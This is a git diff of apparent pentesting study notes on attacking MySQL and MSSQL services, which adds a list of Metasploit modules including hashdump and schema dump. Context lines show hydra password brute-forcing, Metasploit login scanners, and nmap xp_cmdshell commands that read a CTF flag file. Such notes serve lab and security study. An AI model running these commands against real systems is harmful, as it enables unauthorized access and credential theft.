@@ -4,6 +4,9 @@
 	3. Usage
 	4. Related Services
 2. [Tools](#Tools)
+	1. [Hydra](#Hydra)
+	2. [Msfconsole](#msfconsole)
+	3. [nmap](#nmap)
 
 ---
 # Overview 
@@ -40,8 +43,10 @@ dictionary attack
 hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt 192.168.45.3 mysql
 ```
 
+---
+
 ## msfconsole
-### MSQL
+### MYSQL
 - use auxiliary/scanner/mysql/mysql_writable_dirs
 	- set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
 	- setg rhosts 192.168.34.2
@@ -61,6 +66,18 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.tx
 	- set stop_on_success true
 	- set username root
 	- run
+#### Useful modules
+- auxiliary/scanner/mysql/mysql_version
+- auxiliary/scanner/mysql/mysql_login
+- auxiliary/admin/mysql/mysql_enum
+- auxiliary/admin/mysql/mysql_sql
+- auxiliary/scanner/mysql/mysql_file_enum
+- auxiliary/scanner/mysql/mysql_hashdump
+- auxiliary/scanner/mysql/mysql_schemadump
+- auxiliary/scanner/mysql/mysql_writable_dirs
+
+---
+
 ### MSSQL
 - use auxiliary/scanner/mssql/mssql_login
 	- setg rhosts addr
@@ -77,6 +94,7 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.tx
 	- run
 
 ---
+
 ## nmap
 ### MSQL
 - --script
@@ -115,4 +133,3 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.tx
 		- `--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
 			- `ms-sql-xp-cmshell.cm="type c:\flag.txt"`
 				- type is windows version of cat
-	- 
